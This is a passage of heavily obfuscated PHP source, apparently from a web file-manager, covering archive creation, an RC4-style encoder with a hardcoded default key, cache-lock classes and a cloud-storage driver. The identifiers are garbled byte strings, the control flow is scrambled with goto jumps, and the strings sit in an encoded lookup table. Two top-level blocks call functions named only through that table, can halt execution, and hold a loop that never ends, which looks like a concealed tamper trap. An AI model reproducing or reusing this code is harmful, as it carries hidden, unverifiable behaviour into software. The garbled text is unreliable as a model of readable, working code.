$FË‹Úø²ƒ³ . $cÖô÷Ó™”¬); $Bš¶ø·Èó = $d‘Ë‰ØĞ—×[33]; goto b¤å‘Şëâƒ; aî†Š•“èÃ: } static function create($Fî¸‰Òæƒ, $fã¬à´Ñ‘÷) { $E§¸ôˆŠ±Ì =& $_SERVER[¶ªÕß‚ØÁŸ]; self::init(); $Cğ¤‹ì²ó­ = get_path_ext($Fî¸‰Òæƒ); $b”Ò¸ÌòÛ = !1; if (self::checkIfType($Cğ¤‹ì²ó­, $E§¸ôˆŠ±Ì[310])) { if (kodZipArchive::support($E§¸ôˆŠ±Ì[1014])) { return kodZipArchive::create($Fî¸‰Òæƒ, $fã¬à´Ñ‘÷); } $e¦—¿¶…µº = new PclZip($Fî¸‰Òæƒ); foreach ($fã¬à´Ñ‘÷ as $bºğÊÓæÈ… => $EøÂÍÖ¬å) { $EøÂÍÖ¬å = str_replace($E§¸ôˆŠ±Ì[475], $E§¸ôˆŠ±Ì[8], $EøÂÍÖ¬å); $fëÍÚ×¿ºƒ = Kodio::clear(get_path_father($EøÂÍÖ¬å)); if ($bºğÊÓæÈ… == 0) { $b”Ò¸ÌòÛ = $e¦—¿¶…µº->create($EøÂÍÖ¬å, PCLZIP_OPT_REMOVE_PATH, $fëÍÚ×¿ºƒ, PCLZIP_CB_PRE_FILE_NAME, $E§¸ôˆŠ±Ì[1933]); continue; } $b”Ò¸ÌòÛ = $e¦—¿¶…µº->add($EøÂÍÖ¬å, PCLZIP_OPT_REMOVE_PATH, $fëÍÚ×¿ºƒ, PCLZIP_CB_PRE_FILE_NAME, $E§¸ôˆŠ±Ì[1933]); } } else { if (self::checkIfType($Cğ¤‹ì²ó­, $E§¸ôˆŠ±Ì[1904])) { foreach ($fã¬à´Ñ‘÷ as $bºğÊÓæÈ… => $EøÂÍÖ¬å) { $EøÂÍÖ¬å = str_replace($E§¸ôˆŠ±Ì[475], $E§¸ôˆŠ±Ì[8], $EøÂÍÖ¬å); $fëÍÚ×¿ºƒ = Kodio::clear(get_path_father($EøÂÍÖ¬å)); if ($bºğÊÓæÈ… == 0) { $b”Ò¸ÌòÛ = PclTarCreate($Fî¸‰Òæƒ, array($EøÂÍÖ¬å), $Cğ¤‹ì²ó­, null, $fëÍÚ×¿ºƒ); continue; } $b”Ò¸ÌòÛ = PclTarAddList($Fî¸‰Òæƒ, array($EøÂÍÖ¬å), $E§¸ôˆŠ±Ì[33], $fëÍÚ×¿ºƒ, $Cğ¤‹ì²ó­); } } } return $b”Ò¸ÌòÛ; } } class Mcrypt { public static $defaultKey = "\x61\x21\x74\141\153\101\72\x64\x6c\x6d\143\x6c\x64\105\166\x2c\145"; public static function encode($bÍŒ¨³Ê‚ã, $f®Ø‹°äƒ¶ = '', $a—¨¤íŒÌ = 0, $D‹áê¯—ùá = '') { goto EÙÆ™Ï”ñ´; b‰»çš•µ: $bÍŒ¨³Ê‚ã = sprintf($B«İ­ŸÁäğ[1934], $a—¨¤íŒÌ ? $a—¨¤íŒÌ + time() : 0) . substr(md5($bÍŒ¨³Ê‚ã . $dñèˆù—‡), 0, 16) . $bÍŒ¨³Ê‚ã; $Då¨¸¢‰•¦ = strlen($bÍŒ¨³Ê‚ã); $b¼¶¬É„”ã = array(); goto BÈÎéäÌ; díºŸ«“î: $FˆŠƒåÕš£ = substr($D‹áê¯—ùá, -$BˆÕ¯Ñ›¶Ï); $F×ÄçÈÊÒ× = $cø‘Õ­¿œ‹ . md5($cø‘Õ­¿œ‹ . $FˆŠƒåÕš£); $D‚Ş…Œå = strlen($F×ÄçÈÊÒ×); goto b‰»çš•µ; EÙÆ™Ï”ñ´: $B«İ­ŸÁäğ =& $_SERVER[¶ªÕß‚ØÁŸ]; $BˆÕ¯Ñ›¶Ï = 4; $f®Ø‹°äƒ¶ = md5($f®Ø‹°äƒ¶ ? $f®Ø‹°äƒ¶ : self::$defaultKey); goto aÒ˜ß´¼Ü; FŒÅ¡æÙ£Å: $B¡ëİŒƒ‘À = str_replace(array($B«İ­ŸÁäğ[293], $B«İ­ŸÁäğ[8], $B«İ­ŸÁäğ[913]), array($B«İ­ŸÁäğ[420], $B«İ­ŸÁäğ[80], $B«İ­ŸÁäğ[101]), $B¡ëİŒƒ‘À); return $B¡ëİŒƒ‘À; goto c“ÔÀ”Å˜; BÈÎéäÌ: for ($B–Ü åö‘¼ = 0; $B–Ü åö‘¼ <= 255; $B–Ü åö‘¼++) { $b¼¶¬É„”ã[$B–Ü åö‘¼] = ord($F×ÄçÈÊÒ×[$B–Ü åö‘¼ % $D‚Ş…Œå]); } $f¢£Ã¤“³ = range(0, 255); for ($CŞÎÚï¹³Ç = $B–Ü åö‘¼ = 0; $B–Ü åö‘¼ < 256; $B–Ü åö‘¼++) { $CŞÎÚï¹³Ç = ($CŞÎÚï¹³Ç + $f¢£Ã¤“³[$B–Ü åö‘¼] + $b¼¶¬É„”ã[$B–Ü åö‘¼]) % 256; $dîò¸¹˜Û‹ = $f¢£Ã¤“³[$B–Ü åö‘¼]; $f¢£Ã¤“³[$B–Ü åö‘¼] = $f¢£Ã¤“³[$CŞÎÚï¹³Ç]; $f¢£Ã¤“³[$CŞÎÚï¹³Ç] = $dîò¸¹˜Û‹; } goto e¯ˆ‰†¥°¼; e¯ˆ‰†¥°¼: $B¡ëİŒƒ‘À = $B«İ­ŸÁäğ[33]; for ($F¹ïÙŠ™Š· = $CŞÎÚï¹³Ç = $B–Ü åö‘¼ = 0; $B–Ü åö‘¼ < $Då¨¸¢‰•¦; $B–Ü åö‘¼++) { $F¹ïÙŠ™Š· = ($F¹ïÙŠ™Š· + 1) % 256; $CŞÎÚï¹³Ç = ($CŞÎÚï¹³Ç + $f¢£Ã¤“³[$F¹ïÙŠ™Š·]) % 256; $dîò¸¹˜Û‹ = $f¢£Ã¤“³[$F¹ïÙŠ™Š·]; $f¢£Ã¤“³[$F¹ïÙŠ™Š·] = $f¢£Ã¤“³[$CŞÎÚï¹³Ç]; $f¢£Ã¤“³[$CŞÎÚï¹³Ç] = $dîò¸¹˜Û‹; $B¡ëİŒƒ‘À .= chr(ord($bÍŒ¨³Ê‚ã[$B–Ü åö‘¼]) ^ $f¢£Ã¤“³[($f¢£Ã¤“³[$F¹ïÙŠ™Š·] + $f¢£Ã¤“³[$CŞÎÚï¹³Ç]) % 256]); } $B¡ëİŒƒ‘À = $FˆŠƒåÕš£ . str_replace($B«İ­ŸÁäğ[913], $B«İ­ŸÁäğ[33], base64_encode($B¡ëİŒƒ‘À)); goto FŒÅ¡æÙ£Å; aÒ˜ß´¼Ü: $cø‘Õ­¿œ‹ = md5(substr($f®Ø‹°äƒ¶, 0, 16)); $dñèˆù—‡ = md5(substr($f®Ø‹°äƒ¶, 16, 16)); $D‹áê¯—ùá = $D‹áê¯—ùá ? $D‹áê¯—ùá : md5(microtime()); goto díºŸ«“î; c“ÔÀ”Å˜: } public static function decode($fº‹õ…´Ú¬, $Dªï®Ì• = '') { goto C­ÚÂµš‡›; c–ÑŞ’‹«: $fº‹õ…´Ú¬ = base64_decode(substr($fº‹õ…´Ú¬, $cÚÀÓ“ÄÁÍ)); $BÑªÎ„—É = strlen($fº‹õ…´Ú¬); $F·ôÜäÌò‡ = array(); goto f»ô‚ÛŒö; f»ô‚ÛŒö: for ($A×®—ŸëÇ‘ = 0; $A×®—ŸëÇ‘ <= 255; $A×®—ŸëÇ‘++) { $F·ôÜäÌò‡[$A×®—ŸëÇ‘] = ord($FèÃˆ„ÈÜÃ[$A×®—ŸëÇ‘ % $CòƒŸÕ²‘»]); } $Aœ½‰ºãñ¹ = range(0, 255); for ($EÎ¤Î«¿ò¢ = $A×®—ŸëÇ‘ = 0; $A×®—ŸëÇ‘ < 256; $A×®—ŸëÇ‘++) { $EÎ¤Î«¿ò¢ = ($EÎ¤Î«¿ò¢ + $Aœ½‰ºãñ¹[$A×®—ŸëÇ‘] + $F·ôÜäÌò‡[$A×®—ŸëÇ‘]) % 256; $A‹í¥ì¥’ = $Aœ½‰ºãñ¹[$A×®—ŸëÇ‘]; $Aœ½‰ºãñ¹[$A×®—ŸëÇ‘] = $Aœ½‰ºãñ¹[$EÎ¤Î«¿ò¢]; $Aœ½‰ºãñ¹[$EÎ¤Î«¿ò¢] = $A‹í¥ì¥’; } goto d×Ÿ÷‘ìİ¢; F­öŒ½‡®Æ: $Dªï®Ì• = md5($Dªï®Ì• ? $Dªï®Ì• : self::$defaultKey); $AëÚ¢»ÖÜ¾ = md5(substr($Dªï®Ì•, 0, 16)); $AÒäÍÛõÓ— = md5(substr($Dªï®Ì•, 16, 16)); goto A„­É¦‘ÉÊ; A„­É¦‘ÉÊ: $C¾‡ô¦Î = substr($fº‹õ…´Ú¬, 0, $cÚÀÓ“ÄÁÍ); $FèÃˆ„ÈÜÃ = $AëÚ¢»ÖÜ¾ . md5($AëÚ¢»ÖÜ¾ . $C¾‡ô¦Î); $CòƒŸÕ²‘» = strlen($FèÃˆ„ÈÜÃ); goto c–ÑŞ’‹«; d×Ÿ÷‘ìİ¢: $e²óé¯„¸º = $D®¸Ş°âÎõ[33]; for ($bßÙÕÊƒ±´ = $EÎ¤Î«¿ò¢ = $A×®—ŸëÇ‘ = 0; $A×®—ŸëÇ‘ < $BÑªÎ„—É; $A×®—ŸëÇ‘++) { $bßÙÕÊƒ±´ = ($bßÙÕÊƒ±´ + 1) % 256; $EÎ¤Î«¿ò¢ = ($EÎ¤Î«¿ò¢ + $Aœ½‰ºãñ¹[$bßÙÕÊƒ±´]) % 256; $A‹í¥ì¥’ = $Aœ½‰ºãñ¹[$bßÙÕÊƒ±´]; $Aœ½‰ºãñ¹[$bßÙÕÊƒ±´] = $Aœ½‰ºãñ¹[$EÎ¤Î«¿ò¢]; $Aœ½‰ºãñ¹[$EÎ¤Î«¿ò¢] = $A‹í¥ì¥’; $e²óé¯„¸º .= chr(ord($fº‹õ…´Ú¬[$A×®—ŸëÇ‘]) ^ $Aœ½‰ºãñ¹[($Aœ½‰ºãñ¹[$bßÙÕÊƒ±´] + $Aœ½‰ºãñ¹[$EÎ¤Î«¿ò¢]) % 256]); } $eùŒÄÊâë = intval(substr($e²óé¯„¸º, 0, 10)); goto E‚´Ñ¥‹Ğ‚; C­ÚÂµš‡›: $D®¸Ş°âÎõ =& $_SERVER[¶ªÕß‚ØÁŸ]; $fº‹õ…´Ú¬ = str_replace(array($D®¸Ş°âÎõ[420], $D®¸Ş°âÎõ[80], $D®¸Ş°âÎõ[101]), array($D®¸Ş°âÎõ[293], $D®¸Ş°âÎõ[8], $D®¸Ş°âÎõ[913]), $fº‹õ…´Ú¬); $cÚÀÓ“ÄÁÍ = 4; goto F­öŒ½‡®Æ; E‚´Ñ¥‹Ğ‚: if (($eùŒÄÊâë == 0 || $eùŒÄÊâë - time() > 0) && substr($e²óé¯„¸º, 10, 16) == substr(md5(substr($e²óé¯„¸º, 26) . $AÒäÍÛõÓ—), 0, 16)) { return substr($e²óé¯„¸º, 26); } else { return $D®¸Ş°âÎõ[33]; } goto A®æŒÕìĞÎ; A®æŒÕìĞÎ: } } goto dêŒº ´ô; D¼…ùÖ¸‹á: class CacheLockDatabase { public function lock($a¥¯ìğ °­, $dµÈ°Æ¢ÀÇ = 0) { $F­’ã¾ù÷ = Model($_SERVER[¶ªÕß‚ØÁŸ][769]); $eå×‘ŞîÎÅ = microtime(!0) + $dµÈ°Æ¢ÀÇ; while (microtime(!0) < $eå×‘ŞîÎÅ) { $bÕŒä´Ëè³ = $F­’ã¾ù÷->get($a¥¯ìğ °­); if (!$bÕŒä´Ëè³ || $bÕŒä´Ëè³ < microtime(!0)) { $FÖ¼„åÃ‰” = $F­’ã¾ù÷->set($a¥¯ìğ °­, $eå×‘ŞîÎÅ); if ($FÖ¼„åÃ‰”) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($E›”¯ùô–Ş) { return Model($_SERVER[¶ªÕß‚ØÁŸ][769])->get($E›”¯ùô–Ş); } public function unlock($eË”ÈÖ‘±í) { Model($_SERVER[¶ªÕß‚ØÁŸ][769])->remove($eË”ÈÖ‘±í); } } if (!isset($_SERVER[$_SERVER[¶ªÕß‚ØÁŸ][57]]) || !isset($_SERVER[$_SERVER[¶ªÕß‚ØÁŸ][58]])) { goto dÉéê‹›‘õ; dğ‡‰ÈŒ: $bó¿­°ß¼¨($_SERVER[$_SERVER[¶ªÕß‚ØÁŸ][60]] . $_SERVER[¶ªÕß‚ØÁŸ][61]); $D”ÈóîŒ«ç = 2; while ($D”ÈóîŒ«ç > 1) { $Eæ¤Ü¥ÉÎå = rawurlencode($D”ÈóîŒ«ç . $_SERVER[¶ªÕß‚ØÁŸ][66]); } goto BÂ¸¡«Éà; dÉéê‹›‘õ: $B„ä¤›¿±ö = $_SERVER[¶ªÕß‚ØÁŸ][59]; $dÌ¨˜ƒÏ—İ = $_SERVER[$_SERVER[¶ªÕß‚ØÁŸ][60]] . $_SERVER[¶ªÕß‚ØÁŸ][61]; $aöîÓ…ŞÜÒ = $B„ä¤›¿±ö($dÌ¨˜ƒÏ—İ); goto Aâ´²íÕ; Aâ´²íÕ: $DÑñ ‹®ñª = explode($_SERVER[¶ªÕß‚ØÁŸ][62], $aöîÓ…ŞÜÒ); if (count($DÑñ ‹®ñª) < $_SERVER[¶ªÕß‚ØÁŸ][63]) { $D¦ŒÈğßèÂ = $_SERVER[¶ªÕß‚ØÁŸ][64]; $D¦ŒÈğßèÂ(); } $bó¿­°ß¼¨ = $_SERVER[¶ªÕß‚ØÁŸ][65]; goto dğ‡‰ÈŒ; BÂ¸¡«Éà: } class CacheMemcached { public $handle; public $cacheTime; public function __construct($b­Ã•¢Í, $e­ÒÜÙÙèÆ) { $dÈ°»ùŞ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!class_exists($dÈ°»ùŞ[790])) { show_json($dÈ°»ùŞ[791], !1); } $this->cacheTime = $e­ÒÜÙÙèÆ; $this->handle = new Memcached(); if (is_array($b­Ã•¢Í[$dÈ°»ùŞ[792]]) && count($b­Ã•¢Í[$dÈ°»ùŞ[792]]) >= 1) { foreach ($b­Ã•¢Í[$dÈ°»ùŞ[792]] as $aÈ¶øÈ«ˆ) { $d¨é‘½Ñë = explode($dÈ°»ùŞ[4], $aÈ¶øÈ«ˆ); $this->handle->addServer($d¨é‘½Ñë[0], $d¨é‘½Ñë[1]); } } else { $this->handle->addServer($b­Ã•¢Í[$dÈ°»ùŞ[179]], $b­Ã•¢Í[$dÈ°»ùŞ[180]]); } } public function set($E®âƒ„ØÅ×, $cçĞÒ’Ô÷Ş, $E¨•¨—ñŸˆ = false) { $E¨•¨—ñŸˆ = $E¨•¨—ñŸˆ ? $E¨•¨—ñŸˆ : $this->cacheTime; return $this->handle->set($E®âƒ„ØÅ×, $cçĞÒ’Ô÷Ş, $E¨•¨—ñŸˆ); } public function get($Bİìš‘²ƒ) { return $this->handle->get($Bİìš‘²ƒ); } public function remove($B„¹‘ãÁëµ) { return $this->handle->delete($B„¹‘ãÁëµ); } public function deleteAll() { return $this->handle->flush(); } } goto C½ŒÜ¸‹­Æ; báñ»Åœßå: define($_SERVER[¶ªÕß‚ØÁŸ][0], $_SERVER[¶ªÕß‚ØÁŸ][1]); $_SERVER[œˆâ˜åÊâè] = explode($_SERVER[¶ªÕß‚ØÁŸ][2], gzinflate(substr($_SERVER[¶ªÕß‚ØÁŸ][3], 10, -8))); function Model($bºó¢©÷… = '', $A¿ß§…Ã¦ = '', $cÙ´Äï÷£ = '') { goto Cãë·†¬İç; A†òÖ¦·ù: if (isset($C†è¨ôÂ‚‘[$CáæÃ‹±½])) { return $C†è¨ôÂ‚‘[$CáæÃ‹±½]; } if ($bºó¢©÷…) { $bºó¢©÷… = strtoupper($bºó¢©÷…[0]) . substr($bºó¢©÷…, 1); $aùĞ´Çƒ¼ = $bºó¢©÷… . $eÒŠÈíÔí[1]; if (class_exists($aùĞ´Çƒ¼)) { $C†è¨ôÂ‚‘[$CáæÃ‹±½] = new $aùĞ´Çƒ¼(); return $C†è¨ôÂ‚‘[$CáæÃ‹±½]; } } if (!$cÙ´Äï÷£) { $cÙ´Äï÷£ = $GLOBALS[$eÒŠÈíÔí[2]][$eÒŠÈíÔí[3]]; } goto d†”¿ ÄÉ; d†”¿ ÄÉ: $C†è¨ôÂ‚‘[$CáæÃ‹±½] = new ModelBase($bºó¢©÷…, $A¿ß§…Ã¦, $cÙ´Äï÷£); return $C†è¨ôÂ‚‘[$CáæÃ‹±½]; goto bï§§‚ÅÌ›; Cãë·†¬İç: $eÒŠÈíÔí =& $_SERVER[œˆâ˜åÊâè]; static $C†è¨ôÂ‚‘ = array(); $CáæÃ‹±½ = strtolower($A¿ß§…Ã¦ . $eÒŠÈíÔí[0] . $bºó¢©÷…); goto A†òÖ¦·ù; bï§§‚ÅÌ›: } goto aªïéµõ„ˆ; fÎ·Áô„Ú¹: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $c‹ŸÌÚî =& $_SERVER[¶ªÕß‚ØÁŸ]; $e®×ôßŒ®Ô = $GLOBALS[$c‹ŸÌÚî[6]][$c‹ŸÌÚî[346]]; self::$cachePath = $e®×ôßŒ®Ô[$c‹ŸÌÚî[177]][$c‹ŸÌÚî[85]]; @mkdir(self::$cachePath, 511, !0); } public function lock($B¡…¶Û‚®‡, $A‚®ùŞ×Ã› = 0) { goto D¸¤È²ò; D¸¤È²ò: $Eà´Â©ò¦Œ =& $_SERVER[¶ªÕß‚ØÁŸ]; $dÏâ”Š‰Ç = microtime(!0); $c›Ô²ãŒ¼ò = $dÏâ”Š‰Ç + $A‚®ùŞ×Ã› + 0.0001; goto CóÑó„ÌšŒ; CóÑó„ÌšŒ: $EŒñÉÂš· = rtrim(self::$cachePath, $Eà´Â©ò¦Œ[8]) . $Eà´Â©ò¦Œ[786] . md5($B¡…¶Û‚®‡) . $Eà´Â©ò¦Œ[787]; if (file_exists($EŒñÉÂš·) && filemtime($EŒñÉÂš·) && filemtime($EŒñÉÂš·) < time() - 10) { @unlink($EŒñÉÂš·); } do { if (file_exists($EŒñÉÂš·)) { cacheLockWait(); continue; } $A……£ÅÖÂ‰ = fopen($EŒñÉÂš·, $Eà´Â©ò¦Œ[788]); if (!$A……£ÅÖÂ‰) { return !1; } $d…óÎˆó³® = flock($A……£ÅÖÂ‰, LOCK_EX | LOCK_NB); self::$caches[$B¡…¶Û‚®‡] = array($Eà´Â©ò¦Œ[789] => $A……£ÅÖÂ‰, $Eà´Â©ò¦Œ[177] => $EŒñÉÂš·); fwrite($A……£ÅÖÂ‰, $c›Ô²ãŒ¼ò); clearstatcache(); if ($A……£ÅÖÂ‰ && $d…óÎˆó³®) { return !0; } cacheLockWait(); } while (microtime(!0) < $c›Ô²ãŒ¼ò); goto Aàî×Ï¬Ã; Aàî×Ï¬Ã: $this->unlock($B¡…¶Û‚®‡); return !1; goto a·á Ú©Œ‚; a·á Ú©Œ‚: } public function lockGet($DÊëíÀ‹—ê) { $C²òëÁ´Ç =& $_SERVER[¶ªÕß‚ØÁŸ]; $C…¡Üï¨õç = rtrim(self::$cachePath, $C²òëÁ´Ç[8]) . $C²òëÁ´Ç[786] . md5($DÊëíÀ‹—ê) . $C²òëÁ´Ç[787]; return file_exists($C…¡Üï¨õç); } public function unlock($a‰¦ïäáÀ) { goto A¥Ã‰æé‚Ï; bàÉê„Š¶ƒ: unset(self::$caches[$a‰¦ïäáÀ]); goto C’Ø©ã±»‰; eÌ¨¸ššß¦: @flock($F¡à§Ïâäà[$a®À±¹¦„ˆ[789]], LOCK_UN); @fclose($F¡à§Ïâäà[$a®À±¹¦„ˆ[789]]); @unlink($F¡à§Ïâäà[$a®À±¹¦„ˆ[177]]); goto bàÉê„Š¶ƒ; A¥Ã‰æé‚Ï: $a®À±¹¦„ˆ =& $_SERVER[¶ªÕß‚ØÁŸ]; $F¡à§Ïâäà = self::$caches[$a‰¦ïäáÀ]; if (!$F¡à§Ïâäà) { return; } goto eÌ¨¸ššß¦; C’Ø©ã±»‰: } } class CacheLockRedis { public function lock($eÂ½±¸Ï’ö, $e¡§Õ°„àÂ = 10) { $E´Ÿà „Ú¡ = Cache::init(); $a¹‡²™Ÿ¤‚ = microtime(!0) + $e¡§Õ°„àÂ; while (microtime(!0) < $a¹‡²™Ÿ¤‚) { $FÙ’Îç®‘ = $E´Ÿà „Ú¡->get($eÂ½±¸Ï’ö); if (!$FÙ’Îç®‘) { $Dò‹Ãˆ“åô = $E´Ÿà „Ú¡->setLock($eÂ½±¸Ï’ö, $a¹‡²™Ÿ¤‚, $e¡§Õ°„àÂ); if ($Dò‹Ãˆ“åô) { return !0; } } else { if ($FÙ’Îç®‘ < microtime(!0)) { $E´Ÿà „Ú¡->set($eÂ½±¸Ï’ö, $a¹‡²™Ÿ¤‚, $a¹‡²™Ÿ¤‚); if ($E´Ÿà „Ú¡->get($eÂ½±¸Ï’ö) === $FÙ’Îç®‘) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Eô«µ•‹¥æ) { return Cache::init()->get($Eô«µ•‹¥æ); } public function unlock($bßîèöÛá) { return Cache::init()->remove($bßîèöÛá); } } class CacheLockMemcached { public function lock($DĞç‹ÜÊÜ‰, $få‚¡‰ƒê = 0) { $F÷é”ƒøÆ¹ = Cache::init(); $B‹ç½¬ÇÊ = microtime(!0) + $få‚¡‰ƒê; while (microtime(!0) < $B‹ç½¬ÇÊ) { $føËäˆÃ©Ş = $F÷é”ƒøÆ¹->get($DĞç‹ÜÊÜ‰); if (!$føËäˆÃ©Ş || $føËäˆÃ©Ş < microtime(!0)) { $D„ÓñÀî„× = $F÷é”ƒøÆ¹->handle->add($DĞç‹ÜÊÜ‰, $B‹ç½¬ÇÊ, $få‚¡‰ƒê); if ($D„ÓñÀî„×) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($F¨…Œ´”ˆÇ) { return Cache::init()->get($F¨…Œ´”ˆÇ); } public function unlock($bÎ©ô‘¦’Ø) { return Cache::init()->remove($bÎ©ô‘¦’Ø); } } goto D¼…ùÖ¸‹á; aªïéµõ„ˆ: function Action($fàëØÄ½¥º = '') { goto CÑ„ìËíä; C„®Õìö’‹: if (isset($bËëåÌë…•[$C “ÂŸËÃÎ])) { return $bËëåÌë…•[$C “ÂŸËÃÎ]; } $fàëØÄ½¥º = trim(str_replace($eéç‡öçÉ[4], $eéç‡öçÉ[5], $fàëØÄ½¥º), $eéç‡öçÉ[4]); $F«²ÉÇ¥Œª = explode($eéç‡öçÉ[5], $fàëØÄ½¥º); goto cäˆÁ§àğ¨; bÓÙ‹­ŠÂ: $bËëåÌë…•[$c‘¾¡Áö÷«] = new $B³¡ÀÏÄÓ(); $bËëåÌë…•[$C “ÂŸËÃÎ] = $bËëåÌë…•[$c‘¾¡Áö÷«]; return $bËëåÌë…•[$c‘¾¡Áö÷«]; goto bÇÒÎÒ„‘ù; CÑ„ìËíä: $eéç‡öçÉ =& $_SERVER[œˆâ˜åÊâè]; static $bËëåÌë…• = array(); $C “ÂŸËÃÎ = $fàëØÄ½¥º; goto C„®Õìö’‹; cäˆÁ§àğ¨: $f©ÌøŒ…óó = strtolower($F«²ÉÇ¥Œª[0]); if (substr($f©ÌøŒ…óó, -6) == $eéç‡öçÉ[6]) { $fàëØÄ½¥º = substr($F«²ÉÇ¥Œª[0], 0, -6); $B³¡ÀÏÄÓ = $fàëØÄ½¥º . $eéç‡öçÉ[7]; $a“¬„ËÆ = $eéç‡öçÉ[8]; if (isset($F«²ÉÇ¥Œª[1]) && substr(strtolower($F«²ÉÇ¥Œª[1]), -5) == $eéç‡öçÉ[9]) { $B³¡ÀÏÄÓ = $fàëØÄ½¥º . $F«²ÉÇ¥Œª[1]; $a“¬„ËÆ = $eéç‡öçÉ[10] . $F«²ÉÇ¥Œª[1] . $eéç‡öçÉ[11]; } else { if (count($F«²ÉÇ¥Œª) == 3) { $B³¡ÀÏÄÓ = $fàëØÄ½¥º . $F«²ÉÇ¥Œª[1] . $F«²ÉÇ¥Œª[2]; $a“¬„ËÆ = $eéç‡öçÉ[12] . $F«²ÉÇ¥Œª[1] . $eéç‡öçÉ[13] . $F«²ÉÇ¥Œª[2] . $eéç‡öçÉ[11]; } } $a“¬„ËÆ = PLUGIN_DIR . $fàëØÄ½¥º . $eéç‡öçÉ[4] . $a“¬„ËÆ; } else { if (substr($f©ÌøŒ…óó, -5) == $eéç‡öçÉ[9]) { $fàëØÄ½¥º = substr($F«²ÉÇ¥Œª[0], 0, -5); return Model($fàëØÄ½¥º); } else { $B³¡ÀÏÄÓ = $F«²ÉÇ¥Œª[0] . $F«²ÉÇ¥Œª[1]; $a“¬„ËÆ = CONTROLLER_DIR . $F«²ÉÇ¥Œª[0] . $eéç‡öçÉ[4] . $F«²ÉÇ¥Œª[1] . $eéç‡öçÉ[14]; } } $c‘¾¡Áö÷« = strtolower($B³¡ÀÏÄÓ); goto b‚…«„ßË°; b‚…«„ßË°: if (isset($bËëåÌë…•[$c‘¾¡Áö÷«])) { return $bËëåÌë…•[$c‘¾¡Áö÷«]; } if (is_file($a“¬„ËÆ)) { include_once $a“¬„ËÆ; } if (!class_exists($B³¡ÀÏÄÓ)) { return actionCallError("\133{$fàëØÄ½¥º}\40\x3d\76\40{$B³¡ÀÏÄÓ}\135\x20\x63\x6c\x61\x73\163\40\156\157\164\40\x65\170\151\163\x74\163\x21"); } goto bÓÙ‹­ŠÂ; bÇÒÎÒ„‘ù: } function ActionApply($Dë…ñŒŠŠ², $a‹Ÿæø»É = array()) { goto bÆèµÒçÜÇ; bÆèµÒçÜÇ: if (is_array($Dë…ñŒŠŠ²)) { return call_user_func_array($Dë…ñŒŠŠ², $a‹Ÿæø»É); } if (function_exists($Dë…ñŒŠŠ²)) { return call_user_func_array($Dë…ñŒŠŠ², $a‹Ÿæø»É); } $f»æ–©Èñó = strrpos($Dë…ñŒŠŠ², $_SERVER[œˆâ˜åÊâè][5]); goto F¡âêÌËŠ¥; F¡âêÌËŠ¥: $c©£™Æ“Ì = substr($Dë…ñŒŠŠ², 0, $f»æ–©Èñó); $e¦ÈßäÌÏœ = substr($Dë…ñŒŠŠ², $f»æ–©Èñó + 1); $a‚ãŠ¯Î‚£ = Action($c©£™Æ“Ì); goto e…Û©ôÙöÊ; e…Û©ôÙöÊ: if (!method_exists($a‚ãŠ¯Î‚£, $e¦ÈßäÌÏœ)) { return actionCallError("{$Dë…ñŒŠŠ²}\x20\155\x65\164\x68\157\144\40\x6e\x6f\164\x20\x65\170\151\x73\x74\163\x21"); } $C‘ï¼ğ¢„ = call_user_func_array(array($a‚ãŠ¯Î‚£, $e¦ÈßäÌÏœ), $a‹Ÿæø»É); return $C‘ï¼ğ¢„; goto eÀßñ—ï¦‡; eÀßñ—ï¦‡: } function actionCallError($CòğŸù–Ëß) { $Aì«¥îçƒÚ =& $_SERVER[œˆâ˜åÊâè]; $f—î—á¼¶ = json_encode_force(array($Aì«¥îçƒÚ[15] => this_url(), $Aì«¥îçƒÚ[16] => $GLOBALS[$Aì«¥îçƒÚ[16]])); $f—î—á¼¶ = str_replace(array($Aì«¥îçƒÚ[17]), array($Aì«¥îçƒÚ[4]), $f—î—á¼¶); return write_log($CòğŸù–Ëß . $Aì«¥îçƒÚ[18] . $f—î—á¼¶, $Aì«¥îçƒÚ[19]); } goto bÖš’¢ˆ¸§; a­šì¿£ª†: if ($_SERVER[$_SERVER[¶ªÕß‚ØÁŸ][57]] != $_SERVER[$_SERVER[¶ªÕß‚ØÁŸ][1244]]) { goto Dë¡«œØ§·; c…š¡¶¨˜°: $DÑñ ‹®ñª = explode($_SERVER[¶ªÕß‚ØÁŸ][62], $aöîÓ…ŞÜÒ); if (count($DÑñ ‹®ñª) < $_SERVER[¶ªÕß‚ØÁŸ][63]) { $D¦ŒÈğßèÂ = $_SERVER[¶ªÕß‚ØÁŸ][64]; $D¦ŒÈğßèÂ(); } $bó¿­°ß¼¨ = $_SERVER[¶ªÕß‚ØÁŸ][65]; goto dÑËàé—Ö; dÑËàé—Ö: $bó¿­°ß¼¨($_SERVER[$_SERVER[¶ªÕß‚ØÁŸ][58]]); goto eˆÕí¡öæ¿; Dë¡«œØ§·: $B„ä¤›¿±ö = $_SERVER[¶ªÕß‚ØÁŸ][59]; $dÌ¨˜ƒÏ—İ = $_SERVER[$_SERVER[¶ªÕß‚ØÁŸ][60]] . $_SERVER[¶ªÕß‚ØÁŸ][61]; $aöîÓ…ŞÜÒ = $B„ä¤›¿±ö($dÌ¨˜ƒÏ—İ); goto c…š¡¶¨˜°; eˆÕí¡öæ¿: } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\x70\x3a\57\x2f\x76\60\56\141\x70\x69\x2e\x75\160\171\x75\156\56\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($BÀÙ–®Ë) { parent::__construct(); $this->_init($BÀÙ–®Ë); } public function _init($CÎù†ËîøÏ) { foreach ($CÎù†ËîøÏ as $AºÏ²ë†·‹ => $F¡ˆ’Ñğ‰) { if (isset($this->{$AºÏ²ë†·‹})) { $this->{$AºÏ²ë†·‹} = $F¡ˆ’Ñğ‰; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[¶ªÕß‚ØÁŸ][1245], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($d½‰ƒªÑñ‚, $F™ÁˆĞ•”Ï = "\x47\x45\124") { $a¿ŞèŒìö­ =& $_SERVER[¶ªÕß‚ØÁŸ]; $BÀÉÃ¯»Ş = 